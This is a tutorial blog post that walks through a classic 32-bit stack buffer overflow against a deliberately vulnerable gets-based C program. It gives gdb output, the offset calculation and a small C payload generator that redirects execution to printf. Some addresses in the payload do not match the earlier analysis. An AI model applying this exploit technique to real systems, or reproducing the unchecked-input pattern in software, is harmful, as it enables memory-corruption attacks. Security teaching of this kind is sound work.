---
layout:     post
title:      "Secure Threats -- Buffer Overflow Attack -- Level 0"
subtitle:   "Your first hacking attack"
date:       2016-02-14 14:38
author:     "Pufan Jiang"
header-img: "img/post-2016-02-11-poison-pill-pattern.jpg"
tags:
    - Buffer Overflow
    - Secure 
---

This is a short series about secure system. The goal is to show readers that our software system is far from robust and safe, and hopefully you would keep this in mind. (We are all that easy to overlook security problems.)

This first several posts talk about a basic yet highly prevalent attack/hack solution to a software system that seems robust at first glance. This is called Buffer Overflow.

**Pre-requisite** 
The first pre-requisite is quite easy to catch up, but the second and third ones are fundamental pre knowledge.

1. Familiar with C language. (This series would use C program as example.) And know how to use a ```gdb``` to debug C program.
2. Familiar with basic assembly language and be able to read assembly language. (No need to good at writing them!)
3. Know what's a heap, stack, shared library and basically how program is mapped into memory. Or if you could understand what this figure is talking about.

![Program Memory Organization](http://i1371.photobucket.com/albums/ag320/otnt/ProgramMemoryOrganization_zpshdbibtlq.png) 
*([Computer System : A Programmer's Perspective 2nd](http://www.amazon.com/Computer-Systems-Programmers-Perspective-2nd/dp/0136108040/ref=sr_1_3?ie=UTF8&qid=1454639716&sr=8-3&keywords=csapp))*

## Buffer Overflow Attack

Great, now you are ready to hack a system, and I'm showing you a way.

### What is Buffer Overflow
Buffer Overflow is an attack/hacking solution that takes advantage of such a vulnerability: when a victim host is trying to receive a message from an attacker, it doesn't check the length of in-coming message, so the message could be arbitrary long and, as a result, overwrite some part of victim host's  stack memory and make the hack.

### An Example (Your first hacking attack!)

To make this clearer, let's see a typical example.

```c
/* basic.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* server code, I'm victim */
int main(int argc, char** argv)
{
    char buf[16] ;

    printf("Hi, I'm server.\n");
    gets(buf);
    printf("you entered: %s\n", buf);

    return 0;
}
```

This piece of code seems okay at first glance, but the reason it suffers from a buffer overflow attack is the use of this ```gets``` function. Basically ```gets``` copy string from standard input to ```buf```. To understand why this is a problem, we need to look inside the program to know what is happening underneath. Yeah, I mean to read some assembly code.

By running following script, 

```shell
gcc -o basic basic.c -m32
objdump -d basic
```
we could get assembly code of ```basic```. 
(**Note we add a ```-m32``` here to compile it to a 32-bit version**)

```assembly
08048480 <main>:
 ......
 8048495:  8d 44 24 10        lea    0x10(%esp),%eax # some padding
 8048499:  89 04 24           mov    %eax,(%esp)  # put this address as argument for gets function
 804849c:  e8 9f fe ff ff     call   8048340 <gets@plt>
 ......
```
I'm not going to talk about what exactly these assembly do. They are pretty straightforward if you have some experience with assembly language and also notice I add some comments to help you catch the idea.

#### **Now is key point.**
Then what ```gets``` function does is it go through standard input and copy byte by byte to ```buf``` until it met a ```null``` terminator. However, the ```gets``` function doesn't check input length! So what if we input a very long sentence?

```shell
-bash-4.2$ echo "a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence" | ./basic
Hi, I'm server.
you entered: a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence
Segmentation fault (core dumped)
```

The problem is the input is too long so that it override some part of original stack. This could be a disaster since stack is used to keep important variable value. 

And this is why this kind of attack is called Buffer Overflow Attack.

## To do a real attack

To do a real attack, i.e. let the program do something you intend it to do, rather than just crash, we need more work and more analysis.

#### **Analysis**

By using ```gdb```

```
(gdb) b *0x804849c
Breakpoint 1 at 0x804849c
(gdb) r
Starting program: basic 
Hi, I'm server.

Breakpoint 1, 0x0804849c in main ()
(gdb) i r esp
esp            0xffffd210       0xffffd210
(gdb) x/wx 0xffffd210
0xffffd210:     0xffffd220
```

we could find right before ```gets```  is called, ```esp``` is pointing to ```0xffffd220```, which means our input message will be written to this address. 
Also, if we set breakpoint at beginning of ```main``` function, 

```
(gdb) b *0x0x8048480
Breakpoint 2 at 0x8048480
(gdb) r
Starting program: basic
Breakpoint 2, 0x08048480 in main ()
(gdb) i r esp
esp            0xffffd23c       0xffffd23c
```

we could find return address for ```main``` function is saved at  ```0xffffd23c```.

Did you find the secret? The offset between the return address and the address we are going to write is only ```0xffffd23c - 0xffffd220 = 0x1C = 28```. This means if our input message is 28 characters or more, then we could overwrite the return address of ```main``` function!

And let's remind what return instruction does. It puts the value pointed by ```esp``` to ```eip```,  increment ```esp``` by 4 bytes, and execute the code pointed by ```eip```. So this means if we change the value of return address, we could let program go to some surprised place and execute some surprised code!

Moreover, if we construct our input message using executable code and let the return address go to our code, then we could let program do whatever we want! And this closes our analysis! Bravo!

#### **Sum up**
Let's put the pieces together. To do a basic buffer overflow attack, we need to...
1.Find the address where your input message is going to write.
2.Find the most recent return address that is larger than the address in point 1.
3.Carefully calculate the offset of these two addresses and design your input message so that they could be executed by CPU to do some surprisingly fun job.

#### **Let's Hack Our 'Not-so-Robust' Program**
The normal execution of ```basic``` program is prompt exactly same thing as we input. Now we would like it to print ```I'm hacked!``` in a funny way.

To print something, we still need the built-in ```print``` function in ```stdlib```. Take a look at assembly code again,

```
(gdb) p &printf
$2 = (<data variable, no debug info> *) 0xf7e32f60 <printf>
```

To print something, we need to make sure ```esp``` is pointing to what we want to print (i.e. ```I'm hacked!``` in this case), and then call ```printf``` function! The input message should be like this:
[several padding to return address] -- [address to ```printf```] -- [pointer to hacking message]

To call the ```printf``` function is easy, we just need to overwrite the return address in ```main``` function with ```printf``` address, which we've already figured out as  ```0xf7e32f60```. 

Then where is the hacking message? Remember the ```printf``` function print message out until it find a ```null``` terminator. Therefore we could not put the hacking message at front of input message and followed by the padding, since in this way we would print rubbish that we don't want to. So we have to put them at the end of input message. Thus, the input message should be like this:
[several padding to return address] -- [address to ```printf```] -- [pointer to hacking message] -- [hacking message]

One last thing, we need some padding at after return to ```printf```, this is because we use ```printf``` function not by "call" but by "return". As we analyzed before, just before call ```printf```, we make sure ```esp``` pointing to message we want to print out. But when we use "return" to call a function, it first put ```esp``` to ```eip``` and then pop ```esp``` so that ```esp``` will move up by 4 bytes. Also, the value in this padding is the return address after return from ```printf```, i.e. the program will try to execute code at the position of this padding value. So we could put an ```exit``` here to let the program stop.

```
(gdb) p &exit
$5 = (<text variable, no debug info> *) 0xf7e17b10 <exit>
```

Okay! Let's hack it!
We know...
1. The address we are going to write from is: ```0xffffd220```
2. The original return address is at: ```0xffffd23c```
3. The return address need to overwrite as ```0xf7e32f60```
4. The exit address is ```0xf7e17b10```
5. And we put hacking message at the end: ```I'm hacked!```

So, what we need is:
```0xffffd220``` : 28 ```\x90``` as padding
......
```0xffffd23c``` : ```0xf7e32f60``` address to call ```printf```
```0xffffd240``` : ```0xf7e17b10``` address to exit, also as padding
```0xffffd244``` : ```0xffffd248``` pointer to printing message
```0xffffd248``` : ```I'm hacked!```

Another important thing we need to keep in mind is, our system is generally small-endian. This means instead of ```0xf7e32f60``` as is human readable, we need to put ```0x602fe3f7``` in our input message. The same thing holds to ```0xffffd248``` and ```0xf7e17b10```.

So, based on all these analysis. We get our input message:
28 ```\x90```  ```0x602fe3f7``` ```0x107be1f7``` ```0x48d2ffff``` ```I'm hacked!```

To generate the text we could have a helper program ```hack```

```c
/* basic hack.c */
#include <stdio.h>

int main(int argc, char** argv)
{
        int i = 0;
        //padding
        for(i = 0; i < 28; i++)
        {
                printf("\x90");
        }
        printf("\x60\x2f\xe3\xf7");//address to printf
        printf("\xa1\x83\x04\x08");//address to exit
        printf("\x48\xd2\xff\xff");//address to print message
        printf("I'm Hacked!\n");

        return 0;
}
```

Then compile it and save to a file ```hack.txt```

```shell
-bash-4.2$ gcc -o hack hack.c                                                                                      
-bash-4.2$ ./hack > hack.txt
```

Finally use ```gdb``` to test it!

```
(gdb) r < hack.txt 
Starting program: basic < hack.txt
Hi, I'm server.
you entered: ????????????????????????????`/{H?I'm Hacked!
I'm Hacked![Inferior 1 (process 41057) exited with code 0111]
```
**Note** At the end of output, it says program exited with code 0111. This means program doesn't exit normally. This is because the ```exit``` function also use ```esp``` as exit code, but in our program ```esp``` saves address to message. To overcome this problem, we need to use ROP(Return-Oriented-Programming) technique. See following posts!

Last but not least. If you test this attack without ```gdb```, you'll get 

```
-bash-4.2$ ./basic < hack.txt 
Hi, I'm server.
you entered: ????????????????????????????`/{H?I'm Hacked!
Segmentation fault (core dumped)
```
This is because the so-called ASLR(Address Space Layout Randomization) defense technique. We'll talk about how to overcome this defense in following posts. 

And this ends the very basic Buffer Overflow Attack. Hope you enjoy it!
